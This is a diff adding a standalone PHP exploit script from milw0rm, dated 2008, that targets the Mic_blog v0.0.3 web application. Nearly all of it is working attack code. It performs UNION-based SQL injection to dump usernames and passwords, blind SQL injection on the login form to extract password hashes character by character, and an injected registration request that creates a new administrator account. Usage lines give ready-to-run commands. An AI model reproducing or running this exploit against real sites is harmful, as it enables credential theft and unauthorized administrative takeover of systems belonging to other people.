@@ -1,0 +1,247 @@
+#!/usr/bin/php -q
+<?php
+
+error_reporting(0);
+ini_set("default_socket_timeout",5);
+
+
+
+/*
+   Mic_blog v0.0.3 Multiple Remote Exploit
+   -------------------------------------------------------------
+   Discovered By StAkeR aka athos - StAkeR[at]hotmail[dot]it
+   Discovered On 16/10/2008
+   http://miclen.xtreme-corp.net/file/source-mic_blog_v0.0.3-php.tar.gz
+   -------------------------------------------------------------
+   Exploit Coded By Me
+   
+   -1 Remote SQL Injection Exploit
+   -2 Remote Blind SQL Injection Exploit
+   -3 Remote Privilege Escalation Exploit (add a new administrator)
+   
+*/
+
+function inj3ct_sql($conz,$blog,$prefix,$userid)
+{
+  $request = "' union select 0,concat(0x616E6172636879".
+             ",username,0x3a,password,0x616E6172636879),0,0,0,0,0 from ".
+             $prefix ." where id=".$userid."#";
+                    
+  $request = urlencode($request);
+             
+  if(!preg_match('/\w:[0-9]/i',$conz)) usage();   
+  $host = explode(':',$conz);
+  
+  if(!$sock = fsockopen($host[0],$host[1])) die("Socket Error\r\n");
+
+  $pack .= "GET /$blog/category.php?cat=$request HTTP/1.1\r\n";
+  $pack .= "User-Agent: Mozilla/4.5 [en] (Win95; U)\r\n";
+  $pack .= "Host: $host[0]\r\n";
+  $pack .= "Connection: close\r\n\r\n";
+  
+  fputs($sock,$pack);
+
+  while(!feof($sock)) 
+  {
+    $inj3ct .= fgets($sock);
+  } fclose($sock); 
+  
+  if(preg_match('/anarchy(.+?)anarchy/',$inj3ct,$zulp))
+  { 
+    $exp = explode(':',$zulp[1]);
+    return $exp;
+  }
+}
+
+function privilege($inet,$log,$nome,$pass)
+{
+             
+  if(!preg_match('/\w:[0-9]/i',$inet)) usage();
+  $real = explode(':',$inet);
+  
+  if(!$sok = fsockopen($real[0],$real[1])) die("Socket Error\r\n");
+  
+  $send = 'user='.$nome.'&pass='.$pass.'&pass2='.$pass.'&'.
+          'email=subviolence@none.com&email2=subviolence'.
+          '@none.com&mese=4&giorno=3&anno=1993&site=http:'.
+          '//google.it '."','2','a')".'#&news=si&click=R';
+          
+  $pak .= "POST /$log/register.php?reg= HTTP/1.1\r\n";
+  $pak .= "User-Agent: Mozilla/4.5 [en] (Win95; U)\r\n";
+  $pak .= "Host: $host[0]\r\n";
+  $pak .= "Content-Type: application/x-www-form-urlencoded\r\n";
+  $pak .= "Content-Length: ".strlen($send)."\r\n";
+  $pak .= "Connection: close\r\n\r\n";
+  $pak .= $send;
+  
+  fputs($sok,$pak);
+
+  while(!feof($sok)) 
+  {
+    $downme .= fgets($sok);
+  } fclose($sok); 
+  
+  if(preg_match('/utente aggiunto/i',$downme))
+  {
+    return true;
+  }
+  else
+  {
+    return false;
+  }
+}
+
+
+if($argv[5] == "normal") 
+{
+  $normal = inj3ct_sql($argv[1],$argv[2],$argv[3],$argv[4]);
+  
+  if(isset($normal[0]))
+  {
+    echo "[?] Password: $normal[1]\r\n";
+    echo "[?] Username: $normal[0]\r\n";
+    die;
+  }
+  else
+  {
+    echo "[?] Exploit Failed!\r\n";
+    die;
+  }
+}
+ 
+if($argv[5] == "privilege")
+{
+  if(privilege($argv[1],$argv[2],$argv[3],$argv[4]))
+  {
+    echo "[?] Added New Administrator\r\n";
+    echo "[?] Username: $argv[3]\r\n";
+    echo "[?] Password: $argv[4]\r\n";
+    die;
+  }
+  else
+  {
+    echo "[?] Exploit Failed!\r\n";
+    die;
+  }
+}
+ 
+ 
+function http_request($conn,$path,$post) 
+{
+  if(!preg_match('/\w:[0-9]/i',$conn)) usage();
+  $addr = explode(':',$conn);
+  
+  $data = "POST /$path/login.php HTTP/1.1\r\n".  
+          "Host: $addr[0]\r\n".
+          "User-Agent: Mozilla/4.5 [en] (Win95; U)\r\n".
+          "Accept-Encoding: text/plain\r\n".
+          "Content-Type: application/x-www-form-urlencoded\r\n".
+          "Content-Length: ".strlen($post)."\r\n".
+          "Connection: close\r\n\r\n".
+          $post;
+          
+                            
+  if(!$sock = socket_create(AF_INET,SOCK_STREAM,SOL_TCP)) die("socket_create() error!\r\n");
+  if(!socket_set_option($sock,SOL_SOCKET,SO_BROADCAST,1)) die("socket_set_option() error!\r\n"); 
+  if(!socket_connect($sock,$addr[0],(int)$addr[1])) die("socket_connect() error!\r\n");
+  if(!socket_write($sock,$data,strlen($data))) die("socket_write() errror!\r\n");
+  
+  while($get = socket_read($sock,1024,PHP_NORMAL_READ)) 
+  { 
+    $content .= $get; 
+  }
+
+  socket_close($sock);
+  
+  $array = array(
+               'HTTP/1.1 404 Not Found',
+               'HTTP/1.1 300 Multiple Choices',
+               'HTTP/1.1 301 Moved Permanently',
+               'HTTP/1.1 302 Found',
+               'HTTP/1.1 304 Not Modified',
+               'HTTP/1.1 400 Bad Request',
+               'HTTP/1.1 401 Unauthorized',
+               'HTTP/1.1 402 Payment Required',
+               'HTTP/1.1 403 Forbidden',
+               'HTTP/1.1 405 Method Not Allowed',
+               'HTTP/1.1 406 Not Acceptable',
+               'HTTP/1.1 407 Proxy Authentication Required',
+               'HTTP/1.1 408 Request Timeout',
+               'HTTP/1.1 409 Conflict',
+               'HTTP/1.1 410 Gone',
+               'HTTP/1.1 411 Length Required',
+               'HTTP/1.1 412 Precondition Failed',
+               'HTTP/1.1 413 Request Entity Too Large',
+               'HTTP/1.1 414 Request-URI Too Long',
+               'HTTP/1.1 415 Unsupported Media Type',
+               'HTTP/1.1 416 Request Range Not Satisfiable',
+               'HTTP/1.1 417 Expectation Failed',
+               'HTTP/1.1 Retry With',
+              );
+               
+  for($i=0;$i<=count($array);$i++)
+  
+  if(eregi($array[$i],$content)) 
+  {
+    return ("$array[$i]\r\n");
+    break;
+  } 
+  else 
+  {
+    return ("$content\r\n");
+    break;
+  }
+}
+
+
+function char($char,$uid,$table,$idz)
+{
+  return "user=' or ascii(substring((select password from $table where id=$idz),$uid,1))=$char#&pass=aaaaaaaa&click=Login";
+}  
+ 
+function usage()
+{
+  echo "[?] mic blog v0.0.3 Multiple Remote Exploit\r\n\r\n";
+  echo "[?] (Remote\Blind) SQL Injection\r\n";
+  echo "[?] Usage: php [exploit.php] [host:port] [path blog] [table prefix_user] [user id] [normal or blind]\r\n";
+  echo "[?] Example: php mic.php localhost:80 cms mic_user 1 normal\r\n";
+  echo "[?] Example: php mic.php localhost:80 cms mic_user 1 blind\r\n\r\n";
+  echo "[?] Remote Privilege Escalation\r\n";
+  echo "[?] Usage: php mic.php localhost:80 cms [username] [password] [privilege]\r\n";
+  echo "[?] Example: php mic.php localhost:80 cms anarchy mypasswordz privilege\r\n";
+  
+  die;
+}
+ 
+
+$id = 0;
+$hash = array(0,48,49,50,51,52,53,54,55,56,57,97,98,99,100,101,102);
+
+
+for($i=0;$i<=32;$i++)
+{
+  for($j=0;$j<=17;$j++)
+  {
+    if(!eregi('modules.php',http_request($argv[1],$argv[2],char($hash[$j],$id,$argv[3],$argv[4]))))
+    {
+      $password .= chr($hash[$j]);
+      $id++;
+    }
+  }
+}
+
+if(isset($password))
+{
+  echo "[?] Hash: $password\r\n[?] ID: $argv[4]\r\n";
+  die;
+}
+else
+{
+  echo "[?] Exploit Failed!\r\n";
+  die;
+}
+
+
+?>
+
+# milw0rm.com [2008-10-16]
